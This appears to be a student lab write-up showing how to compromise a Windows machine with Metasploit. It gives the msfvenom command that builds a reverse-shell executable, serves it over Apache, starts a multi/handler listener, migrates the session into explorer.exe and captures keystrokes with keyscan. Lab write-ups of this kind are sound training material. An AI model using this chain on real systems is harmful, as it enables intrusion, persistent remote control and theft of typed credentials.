# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

![1](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/8cfa1f24-947f-4a5f-b91b-3fd8a5aa8b07)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![2](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/531f5f7e-e5e9-47c1-96f9-42ed06865c5d)

copy the fun.exe into the apache /var/www/html folder

![3](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/aef02176-708a-4b26-b46e-068c69df4c63)

copy the fun.exe into the apache /var/www/html folder

![4](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/bb9737a9-4b59-45d4-8ee1-ac105a0e8dee)

Check the status of apache2

![5](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/e73a57b1-266b-4fd3-989f-f2fba75e1ded)

Invoke msfconsole:

![5](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/10652f15-7233-49e7-a50a-8f72e68fddda)



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![7](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/6f553616-2db9-4823-b759-c3fb229f57c9)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![8](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/c8ad82b7-a478-464b-88d6-2f8d0840109c)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![9](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/31acefb4-b780-4d14-84f7-f2c30160b52d)

Bypass any warning boxes, double-click the file, and allow it to run.

![10](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/9e7cb0e3-a8c2-4578-97aa-d0d04007a097)

On kali give the command exploit

![11](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/1d873a7b-f9c1-4d8a-9272-e669e56e7a49)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![12](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/0e187c30-83f2-413b-a055-e228672d427b)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![13](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/6a5558e8-fb08-4339-861a-2103b6f8fd8b)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![14](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/0ecb9b64-f626-4f9a-a0de-a8ec0591fe08)

![15](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/566a36e7-9ed1-4063-a62d-547cd1de141e)

keyscan_dump Shows the keystrokes captured so far

![16](https://github.com/Nandhinijaya/Compromising-windows-using-Metasploit/assets/121998147/7a63ff7f-c2e5-42cf-a7ff-2184aebd5133)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
